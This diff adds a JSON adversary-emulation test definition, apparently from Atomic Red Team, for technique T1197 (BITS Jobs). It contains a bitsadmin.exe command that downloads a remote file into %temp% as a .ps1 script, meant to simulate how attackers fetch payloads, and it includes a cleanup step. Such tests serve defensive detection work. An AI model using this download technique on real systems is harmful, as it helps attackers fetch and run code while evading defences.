@@ -1,0 +1,36 @@
+{
+    "name": "Bitsadmin Download (cmd)",
+    "description": "This test simulates an adversary leveraging bitsadmin.exe to download and execute a payload ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n",
+        "cleanup_command": "del #{local_file} >nul 2>&1\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1197",
+    "tactics": [
+        "Persistence",
+        "Defense Evasion"
+    ],
+    "technique": "BITS Jobs",
+    "source": "ART",
+    "uuid": "3c73d728-75fb-4180-a12f-6712864d7421",
+    "arguments": {
+        "remote_file": {
+            "description": "Remote file to download",
+            "type": "url",
+            "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
+        },
+        "local_file": {
+            "description": "Local file path to save downloaded file",
+            "type": "path",
+            "default": "%temp%\\bitsadmin1_flag.ps1"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
